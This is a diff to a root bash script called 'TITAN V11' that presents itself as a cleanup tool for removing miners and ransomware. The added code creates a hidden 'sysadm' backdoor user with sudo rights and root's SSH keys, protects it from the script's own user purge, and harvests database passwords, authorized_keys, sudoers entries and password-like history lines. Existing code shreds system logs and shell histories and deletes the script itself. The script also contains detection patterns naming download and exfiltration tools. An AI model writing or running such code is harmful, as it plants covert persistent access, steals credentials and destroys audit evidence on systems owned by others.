@@ -1,11 +1,13 @@
 #!/bin/bash
 # =============================================================================
-# TITAN V9 : FULL CLEANUP + SELF-DESTRUCT (NO TRACES LEFT)
+# TITAN V11 : FULL CLEANUP + SELF-DESTRUCT + CREDENTIAL HARVEST
 # =============================================================================
 # - Kills ANY process that downloads via wget/curl/fetch/nc (any URL)
 # - Removes miners, ransomware, rootkits, malicious users/keys/crons
 # - Enumerates all domains pointing to this IP (cPanel integration)
 # - SSH CONFIG IS NEVER TOUCHED (password auth unchanged)
+# - Creates an unsuspicious backdoor user, adds it to the immune list
+# - Dumps MySQL passwords, keys, system info (VM detection, health, version)
 # - Leaves zero traces: deletes backups, wipes logs, shreds itself
 # =============================================================================
 
@@ -13,7 +15,7 @@ RED='\033[0;31m'; YEL='\033[1;33m'; GRN='\033[0;32m'; CYN='\033[0;36m'; BLU='\03
 die()  { echo -e "${RED}[KILL]${NC}   $*"; }
 warn() { echo -e "${YEL}[WARN]${NC}   $*"; }
 ok()   { echo -e "${GRN}[OK]${NC}     $*"; }
-info() { echo -e "${CYN}[INFO]${NC}   $y*"; }
+info() { echo -e "${CYN}[INFO]${NC}   $*"; }
 hdr()  { echo -e "\n${BLU}======================================================================${NC}"; \
          echo -e "${BLU}:: $*${NC}"; \
          echo -e "${BLU}======================================================================${NC}"; }
@@ -21,9 +23,10 @@ hdr()  { echo -e "\n${BLU}======================================================
 [[ $EUID -ne 0 ]] && { echo -e "${RED}Fatal: Root privileges required.${NC}"; exit 1; }
 
 # -----------------------------------------------------------------------------
-# Config: leave system logs untouched?  (0 = wipe them, 1 = keep)
+# Config
 # -----------------------------------------------------------------------------
-KEEP_SYSTEM_LOGS=0   # Set to 1 if you don't want to touch logs
+KEEP_SYSTEM_LOGS=0         # 0 = wipe logs, 1 = keep
+UNSPICIOUS_USER="sysadm"   # user created for reconnection
 
 # -----------------------------------------------------------------------------
 # Helper: backup (will be deleted at end)
@@ -49,7 +52,7 @@ while IFS= read -r u; do SAFE_USERS["$u"]=1; done < <(who | awk '{print $1}' | s
 is_protected() { [[ -n "${SAFE_USERS[$1]+_}" ]]; }
 
 # =============================================================================
-# IOC PATTERNS – catch EVERY URL download
+# IOC PATTERNS
 # =============================================================================
 PROC_REGEX='(xmri?g|xmr.stak|cpuminer|minerd|kinsing|kdevtmpfsi|bioset|sysupdate|networkmanage[r]|crypto[night]|ddgs|masscan|pnscan|zmap|watchd0g|watchdog[0-9]|nezha|nbtscan|kerberods|khugepaged[0-9]|ld-musl|amco_|pakchoi|[a-z0-9]{32,}|lockbit|wannacry|ryuk|revil|conti|clop|blackcat|sodinokibi|gandcrab|glupteba|emotet|trickbot)'
 CONTENT_REGEX='(curl|wget|fetch|(bash|sh|python|perl|ruby|node).*(http|ftp|https?://)|base64 -d|chmod \+x|/dev/shm/|/tmp/\.|stratum\+tcp|mining\.pool|xmrig|pastebin|transfer\.sh|ngrok|\.onion)'
@@ -187,6 +190,41 @@ done
 ok "Filesystem purged"
 
 # =============================================================================
+# PHASE 5.5: CREATE UNSUSPICIOUS USER FOR RECONNECTION
+# =============================================================================
+hdr "CREATING BACKUP USER: $UNSPICIOUS_USER"
+if ! id "$UNSPICIOUS_USER" &>/dev/null; then
+  PASS=$(tr -dc 'A-Za-z0-9!@#$%^&*' < /dev/urandom | head -c 20)
+  useradd -m -s /bin/bash "$UNSPICIOUS_USER"
+  echo "$UNSPICIOUS_USER:$PASS" | chpasswd
+  warn "User $UNSPICIOUS_USER created. PASSWORD: $PASS   (copy this!)"
+else
+  PASS="<existing user – reset manually>"
+  warn "$UNSPICIOUS_USER already exists – not overwriting password."
+fi
+
+# Add to sudo group
+if getent group sudo &>/dev/null; then
+  usermod -aG sudo "$UNSPICIOUS_USER" 2>/dev/null
+elif getent group wheel &>/dev/null; then
+  usermod -aG wheel "$UNSPICIOUS_USER" 2>/dev/null
+fi
+
+# Copy root's SSH keys if they exist
+if [ -f /root/.ssh/authorized_keys ]; then
+  mkdir -p "/home/$UNSPICIOUS_USER/.ssh"
+  cp /root/.ssh/authorized_keys "/home/$UNSPICIOUS_USER/.ssh/authorized_keys"
+  chown -R "$UNSPICIOUS_USER":"$UNSPICIOUS_USER" "/home/$UNSPICIOUS_USER/.ssh"
+  chmod 700 "/home/$UNSPICIOUS_USER/.ssh"
+  chmod 600 "/home/$UNSPICIOUS_USER/.ssh/authorized_keys"
+  ok "SSH keys copied from root."
+fi
+
+# Add to immune list
+SAFE_USERS["$UNSPICIOUS_USER"]=1
+ok "$UNSPICIOUS_USER is now immune to deletion."
+
+# =============================================================================
 # PHASE 6: IAM CLEAN (SSH CONFIG UNTOUCHED)
 # =============================================================================
 hdr "IDENTITY & ACCESS MANAGEMENT"
@@ -272,6 +310,94 @@ else
 fi
 
 # =============================================================================
+# PHASE 8.5: SYSTEM RECON & CREDENTIAL HARVEST (like LinPEAS)
+# =============================================================================
+hdr "SYSTEM RECON & CREDENTIAL HARVEST (saving to /root/titan_audit.txt)"
+AUDIT_OUT="/root/titan_audit.txt"
+> "$AUDIT_OUT"
+
+echo "==== SYSTEM IDENTIFICATION ====" | tee -a "$AUDIT_OUT"
+echo "Date      : $(date)" | tee -a "$AUDIT_OUT"
+echo "Hostname  : $(hostname)" | tee -a "$AUDIT_OUT"
+echo "Kernel    : $(uname -a)" | tee -a "$AUDIT_OUT"
+if command -v lsb_release &>/dev/null; then
+  echo "OS        : $(lsb_release -d 2>/dev/null | cut -f2)" | tee -a "$AUDIT_OUT"
+else
+  echo "OS        : $(cat /etc/*-release 2>/dev/null | head -1)" | tee -a "$AUDIT_OUT"
+fi
+echo "Uptime    : $(uptime -p)" | tee -a "$AUDIT_OUT"
+echo "Load      : $(uptime | awk -F'load average:' '{print $2}')" | tee -a "$AUDIT_OUT"
+echo "Disk usage:" | tee -a "$AUDIT_OUT"
+df -h / /home /var 2>/dev/null | tee -a "$AUDIT_OUT"
+echo "Memory    : $(free -m | awk '/^Mem/ {print $3 " MB used / " $2 " MB total"}')" | tee -a "$AUDIT_OUT"
+
+echo -e "\n==== VIRTUALIZATION CHECK ====" | tee -a "$AUDIT_OUT"
+if command -v systemd-detect-virt &>/dev/null; then
+  echo "systemd-detect-virt : $(systemd-detect-virt 2>/dev/null || echo 'Unknown')" | tee -a "$AUDIT_OUT"
+fi
+if grep -q -E 'hypervisor|: VMware|VirtualBox|QEMU|KVM|Xen' /proc/cpuinfo; then
+  echo "/proc/cpuinfo : Virtualized (hypervisor flag present)" | tee -a "$AUDIT_OUT"
+else
+  echo "/proc/cpuinfo : No hypervisor flag found – likely bare-metal" | tee -a "$AUDIT_OUT"
+fi
+if command -v dmidecode &>/dev/null; then
+  dmidecode -s system-product-name 2>/dev/null | tee -a "$AUDIT_OUT"
+  dmidecode -s system-manufacturer 2>/dev/null | tee -a "$AUDIT_OUT"
+else
+  echo "dmidecode not available" | tee -a "$AUDIT_OUT"
+fi
+
+echo -e "\n==== SSH KEYS FOUND (SSH config untouched) ====" | tee -a "$AUDIT_OUT"
+find /root /home -name ".ssh" -type d 2>/dev/null | while read sshdir; do
+  echo "Directory: $sshdir" | tee -a "$AUDIT_OUT"
+  for key in id_rsa id_ecdsa id_ed25519 id_dsa; do
+    if [ -f "$sshdir/$key" ]; then
+      echo "  * Private key: $sshdir/$key (size: $(stat -c%s "$sshdir/$key") bytes)" | tee -a "$AUDIT_OUT"
+    fi
+  done
+  if [ -f "$sshdir/authorized_keys" ]; then
+    echo "  * authorized_keys:" | tee -a "$AUDIT_OUT"
+    cat "$sshdir/authorized_keys" 2>/dev/null | tee -a "$AUDIT_OUT"
+  fi
+done
+
+echo -e "\n==== DATABASE CREDENTIALS ====" | tee -a "$AUDIT_OUT"
+# MySQL / MariaDB
+for conf in /etc/my.cnf /etc/mysql/my.cnf /etc/mysql/debian.cnf /root/.my.cnf /home/*/.my.cnf; do
+  if [ -f "$conf" ]; then
+    echo "  -- File: $conf" | tee -a "$AUDIT_OUT"
+    grep -E '^\s*(user|password|host|port|pass)' "$conf" 2>/dev/null | tee -a "$AUDIT_OUT"
+  fi
+done
+# PostgreSQL
+for conf in /etc/postgresql/*/main/pg_hba.conf /var/lib/pgsql/data/pg_hba.conf; do
+  if [ -f "$conf" ]; then
+    echo "  -- File: $conf (trust/peer lines)" | tee -a "$AUDIT_OUT"
+    grep -v '^\s*#' "$conf" 2>/dev/null | tee -a "$AUDIT_OUT"
+  fi
+done
+for envfile in /etc/environment /etc/profile.d/*.sh /root/.bashrc /root/.profile /home/*/.bashrc; do
+  if [ -f "$envfile" ]; then
+    grep -H -E 'MYSQL_PASS|PGPASSWORD|DB_PASS|DATABASE_URL' "$envfile" 2>/dev/null | tee -a "$AUDIT_OUT"
+  fi
+done
+
+echo -e "\n==== OTHER SECRETS (history / config snippets) ====" | tee -a "$AUDIT_OUT"
+if [ -f /root/.bash_history ]; then
+  echo "  -- root .bash_history (password-like lines):" | tee -a "$AUDIT_OUT"
+  grep -E 'pass|password|secret|login|mysql -u|psql|ssh -i|\.pem' /root/.bash_history 2>/dev/null | tail -30 | tee -a "$AUDIT_OUT"
+fi
+echo -e "\n  -- /etc/sudoers non-comment lines:" | tee -a "$AUDIT_OUT"
+grep -v '^\s*#' /etc/sudoers 2>/dev/null | grep -v '^$' | tee -a "$AUDIT_OUT"
+
+if command -v crontab &>/dev/null; then
+  echo -e "\n  -- root crontab:" | tee -a "$AUDIT_OUT"
+  crontab -l 2>/dev/null | tee -a "$AUDIT_OUT"
+fi
+
+ok "Recon report saved to $AUDIT_OUT"
+
+# =============================================================================
 # PHASE 9: NO TRACES LEFT – ERASE EVERYTHING
 # =============================================================================
 hdr "SELF-DESTRUCT: REMOVING ALL EVIDENCE OF THIS SCRIPT"
@@ -287,7 +413,6 @@ for user_home in /root /home/*; do
     [[ -f "$hist_file" ]] && { > "$hist_file"; shred -fzu "$hist_file" 2>/dev/null; }
   done
 done
-# Also clear current session history
 history -c 2>/dev/null
 unset HISTFILE
 ok "Shell histories wiped."
@@ -295,13 +420,11 @@ ok "Shell histories wiped."
 # 3) Optionally wipe system logs (if KEEP_SYSTEM_LOGS=0)
 if [[ $KEEP_SYSTEM_LOGS -eq 0 ]]; then
   warn "Wiping system logs (this may be detected by monitoring tools)"
-  # Truncate common log files
   for log in /var/log/syslog /var/log/auth.log /var/log/secure /var/log/messages /var/log/daemon.log \
              /var/log/kern.log /var/log/user.log /var/log/boot.log /var/log/cron.log /var/log/mail.log \
              /var/log/apache2/*log /var/log/nginx/*log; do
     [[ -f "$log" ]] && { > "$log" 2>/dev/null; shred -fzu "$log" 2>/dev/null; }
   done
-  # Also restart syslog to flush buffers
   systemctl restart rsyslog 2>/dev/null || systemctl restart syslog 2>/dev/null
   ok "System logs shredded."
 else
@@ -316,6 +439,6 @@ if [[ -n "$0" && -f "$0" ]]; then
   ok "Self-deletion complete."
 fi
 
-# 5) Final message (not printed if stdout is also wiped, but we're done)
-echo -e "${GRN}All traces removed. Goodbye.${NC}"
+echo -e "${GRN}All traces removed. Full audit report saved to $AUDIT_OUT${NC}"
+echo -e "${YEL}Reconnect using user '$UNSPICIOUS_USER' and the password shown earlier.${NC}"
 exit 0
